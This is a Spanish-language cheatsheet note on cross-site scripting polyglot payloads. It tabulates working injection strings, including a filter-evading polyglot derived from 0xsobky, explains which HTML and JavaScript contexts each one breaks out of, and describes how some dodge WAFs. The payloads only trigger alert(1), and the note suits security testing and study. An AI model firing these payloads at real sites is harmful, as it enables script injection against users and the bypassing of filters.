---
aliases:
tags:
  - type/cheatsheet
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
  - "[[Cross-Site Scripting (XSS)]]"
---
# XSS - Payloads Polyglot

***

## Cheatsheet

|**Vector / Payload Polyglot**|**Contextos Neutralizados**|**Análisis de la Estructura**|
|---|---|---|
|`'">><script>alert(1)</script>`|Atributos (`"`, `'`), Etiquetas abiertas.|El payload básico. Inyecta comillas dobles y simples para cerrar cualquier atributo en el que aterrice, seguido de `>>` para asegurar el cierre de la etiqueta anfitriona antes de abrir el bloque de script.|
|`-->` `</textarea></style></title></script>` `<svg/onload=alert(1)>`|Comentarios HTML, Bloques de texto plano, Etiquetas protectoras.|Cierra prematuramente comentarios HTML (`-->`) y todas las etiquetas comunes que bloquean la ejecución de código (tratando el contenido como texto). Finalmente inyecta un vector basado en eventos.|
|`javascript://%250Aalert(1)//"undefined"==typeof action&&a=="'`|Atributos de URL (`href`, `src`), Bloques JavaScript (`<script>`).|Opera como un esquema válido si aterriza en un enlace. El `%250A` (doble URL encode de un salto de línea) y los comentarios `//` aseguran que la sintaxis de JavaScript no se rompa si se refleja dentro de una variable.|
|`";alert(1);//` `';alert(1);//`|Variables JavaScript explícitas.|Diseñado para reflejos dentro de bloques `<script>` legítimos. Rompe cadenas envueltas en comillas simples o dobles, finaliza la declaración con `;`, ejecuta la alerta y comenta cualquier sintaxis residual que pueda generar errores fatales en el intérprete.|
|`jaVasCript:/*-/*\`/_`/_'/_"/**/(/_ */oNcliCk=alert(1) )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e`|Omnicontexto (Polyglot avanzado, derivado de 0xsobky).|Cubre atributos, pseudo-protocolos, scripts en línea, comentarios modernos (`--!>`), bloqueadores de texto y evasión de filtros sensibles a mayúsculas. Emplea codificación hexadecimal (`\x3c` para `<`) para evadir WAFs básicos que bloquean la apertura de etiquetas estándar.|

___

## Overview

Un payload Polyglot es una cadena de inyección multipropósito, construida meticulosamente para ejecutarse de forma simultánea en múltiples contextos de renderizado (HTML base, atributos con comillas simples o dobles, bloques de JavaScript, áreas de texto, comentarios).

El objetivo de utilizar este vector es lograr la ejecución directa del script malicioso a ciegas, forzando la ruptura de múltiples barreras sintácticas al mismo tiempo, sin necesidad de conocer de antemano el punto exacto de reflexión en el código fuente ni los caracteres de escape específicos que requiere el entorno.